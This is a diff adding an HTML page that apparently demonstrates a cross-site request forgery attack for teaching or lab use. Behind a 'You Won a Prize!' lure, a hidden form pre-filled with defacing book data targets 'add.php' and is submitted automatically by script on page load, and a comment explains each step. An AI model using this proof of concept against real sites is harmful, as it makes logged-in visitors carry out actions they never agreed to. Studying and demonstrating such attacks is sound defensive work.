@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>You Won a Prize!</title>
+</head>
+
+<body>
+    <h1>Loading your prize...</h1>
+
+    <!-- 
+        CSRF ATTACK EXPLANATION:
+        1. This form targets the legitimate 'add.php' page.
+        2. It pre-fills the fields with malicious data.
+        3. The JavaScript at the bottom automatically submits the form when the page loads.
+        4. If a user visits this page (and is logged in/has access to the target), 
+           the action is performed without their explicit consent.
+    -->
+    <form action="add.php" method="POST" id="csrf-form" style="display:none;">
+        <input type="text" name="title" value="CSRF HACKED BOOK">
+        <input type="text" name="author" value="Evil Attacker">
+        <input type="number" name="year" value="1337">
+        <input type="text" name="description" value="You have been victim of a Cross-Site Request Forgery attack!">
+        <input type="submit" name="submit" value="Submit">
+    </form>
+
+    <script>
+        // Auto-submit the form
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+
+</html>
